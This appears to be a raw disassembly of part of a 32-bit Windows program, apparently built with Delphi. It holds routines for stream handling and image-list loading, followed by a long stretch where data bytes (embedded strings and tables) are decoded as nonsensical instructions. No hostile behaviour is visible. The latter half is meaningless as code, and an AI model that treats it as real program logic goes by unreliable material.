mov ebx eax
xor eax eax
push ebp
push sub_442330
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442337
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_442364
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4139f4
mov si 0xffff
call sub_4032f4
inc ebp
dec edi
jne r-xdata
sub_4423b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4138e4
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139f4
cmp ebp eax
jne r-xdata
sub_44240c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407a40
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_442450
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_441c2c
mov ebx eax
mov eax edi
call sub_441c2c
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_441c2c
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44252c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44250f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44240c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442516
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
mov eax edi
call sub_441c2c
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_442540
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_441c2c
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_442450
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44259c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a054
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_442540
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4425f4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415ca0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415ca0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442878
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415a74
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415a94
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44285b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202b4
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4215ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4125c0
mov eax [ ebp - 0x4 ]
call sub_442c20
xor eax eax
push ebp
push sub_44283e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442845
mov eax [ ebp - 0xc ]
call sub_4030f8
mov eax [ ebp - 0x14 ]
call sub_4030f8
mov eax [ ebp - 0x4 ]
call sub_442c24
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4125e8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_42087c
push eax
mov eax [ ebp - 0xc ]
call sub_42087c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d764
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4125e8
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_42087c
push eax
mov eax [ ebp - 0x14 ]
call sub_42087c
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d764
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_441b60
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_442888
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a7d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4428e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4419f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428ef
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub eax 0xffffffec
sub_4428ef
mov eax [ ebp - 0x4 ]
call sub_4418e8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442a1e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415a94
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41619c
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415a94
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4030f8
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415a94
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a7d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442a01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415a94
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4419f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415a94
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_442a50
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_441a88
mov eax edi
call sub_415a74
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415a94
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4425f4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_442888
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_442adc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a7d4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442bd6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bb7c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_441a24
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_441a24
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442bdd
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
jmp r-xdata
sub_442c44
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
mov edx esi
call sub_4423b4
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_442c90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442cb5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442cbc
retn
sub_4431a8
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
outsb
jne r-xdata
popad
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
[ eax + 0x1004465 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insd
popad
jae r-xdata
add [ eax ] al
jmp [ eax ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
int3
add [ eax ] dh
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
add bh bh
pop esp
inc esp
or al 0x2f
inc esp
add [ eax + eax ] bh
add bh bh
clc
ja r-xdata
adc [ eax ] al
cmp eax 0xc0ff0000
imul eax [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xdc6d6574
cmovno eax [ eax ]
pushad
add [ eax ] al
[ eax ]
dec ecx
outsb
js r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
adc al 0x67
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
[ esp + 0x44 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
or eax 0x4d627553
cmovno eax [ eax ]
push esp
add [ eax ] al
call [ eax + eax ]
push [ eax + 0x446d ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
js r-xdata
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
dec esp
inc esp
add [ eax + 0x6d ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
or al 0x17
inc esp
add [ eax + eax ] bh
[ edi + ebp * 2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
add [ eax ] cl
add bh bh
dec esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
mov esi 0x6a500041
inc esp
add al ch
push 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x442d2070
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
nop
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
dec [ esi + 0x44 ]
add al dl
insd
inc esp
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
and [ ebp + 0x44 ] ah
add [ eax + 0x6d ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
add [ eax ] al
dec ebp
outsd
dec ecx
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
fmul [ edi ]
inc ecx
add [ eax ] ah
add bh bh
sub [ esi + 0x44 ] ah
add al dh
insd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
cwde
inc ebx
jne r-xdata
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx + eax * 4 ] ah
inc esp
add al al
add [ eax + eax + 0x3c ] 0x340041a1
mov [ 0xffffffffa4640041 ] al
inc ecx
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ esp + 0x41 ] ch
add [ eax + 0x78 ] ah
inc esp
add [ ecx + eax * 4 ] cl
inc esp
add [ eax + 0x79 ] dl
inc esp
add [ ecx + eax * 4 ] bh
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
dec esp
mov eax [ 0xffffffffa1440041 ]
inc ecx
jb r-xdata
add [ 0x35300044 ] dh
add [ eax ] al
insd
and al 0x2e
inc esp
add [ eax - 0x67010000 ] bl
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
cld
js r-xdata
xor eax [ eax ]
mov al [ 0x3c00419d ]
ja r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
inc esp
add [ ecx ] bh
inc ecx
add [ edx ] dh
dec ecx
je r-xdata
add [ edx ] dl
xor eax 0x35260044
inc esp
add [ eax ] bl
add [ eax ] al
shl [ edx ] 0x41
je r-xdata
inc ecx
add [ esp + 0x41 ] ah
mov eax [ 0xffffffffa2340041 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
les esi [ esp + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax 0x35300044
jae r-xdata
insd
pushfd
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_443570
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x36
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
xor eax 0x600044
add [ eax ] al
js r-xdata
inc esp
add [ ecx ] bh
inc ecx
add [ edx ] dh
inc ecx
add [ esp + 0x41 ] ah
inc esp
add [ esp + 0x41 ] cl
add [ ebx + esi ] dh
inc eax
add [ eax + 0x3c00419d ] ah
xor eax [ eax ]
xor [ ebx ] dh
inc eax
add [ eax - 0x53ffbfd0 ] dl
xor [ eax ] al
cld
js r-xdata
add al dh
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ edi + ebp + 0x44 ] dl
add al ah
test [ eax + eax - 0x10 ] eax
outsb
jne r-xdata
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add [ eax + 0x78 ] ah
inc esp
add [ ecx + eax * 4 ] cl
inc esp
add ah bh
xchg [ eax + eax + 0x40 ] al
xchg [ eax + eax + 0x9 ] al
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
add [ eax ] dl
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx + eax * 4 ] ah
inc esp
add al al
add [ eax + eax + 0x3c ] 0x340041a1
mov [ 0xffffffffa4640041 ] al
inc ecx
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
pop ss
dec eax
outsd
je r-xdata
add [ eax ] al
hlt
rol [ esi + esi ] 0x44
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xb8756e65
xor eax 0x352c0044
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
dec [ eax - 0x80 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
push eax
aaa
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
inc esp
add [ eax ] cl
add bh bh
test [ ecx + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
or al 0x17
push esp
das
inc esp
add [ eax ] al
xchg [ eax + eax + 0x10 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
shl [ edi ] 0x1
jo r-xdata
outsb
je r-xdata
ja r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
jmp [ eax ]
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + esi + 0x44 ] cl
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
dec esp
aaa
inc esp
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax + esi - 0x72abffc0 ] ch
inc esp
add [ eax ] dl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
add [ eax ] al
xchg [ eax + eax + 0x10 ] al
xchg [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc ecx
inc ecx
add [ eax + 0x41 ] dl
add [ eax + eax * 2 ] ch
inc ecx
add [ ecx + eax * 4 ] ah
inc esp
add al al
add [ eax + eax + 0x3c ] 0x340041a1
mov [ 0xffffffffa4640041 ] al
inc ecx
add [ ecx + 0x41 ] cl
add [ ecx + 0x41 ] al
add [ esp + 0x41 ] ch
add al ah
mov [ eax + eax + 0xc ] es
add [ eax + eax + 0x50 ] 0x3c004479
add [ eax + eax - 0x78 ] 0x4000448d
mov es [ eax + eax + 0xa ]
push esp
push eax
outsd
jo r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add al ah
test [ eax + eax - 0x10 ] eax
test [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
outsb
jne r-xdata
outsd
cmp [ eax ] bh
inc esp
je r-xdata
jne r-xdata
int3
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
cmovno eax [ eax ]
pushfd
lea eax [ eax + eax - 0x5c ]
lea eax [ eax + eax + 0x1 ]
dec eax
outsd
je r-xdata
xor [ eax ] al
push esp
lea eax [ eax + eax + 0x10 ]
dec esp
movsb [ edi ] [ esi ]
inc ecx
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + esi + 0x740d0044 ] cl
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
aaa
xor eax [ eax ]
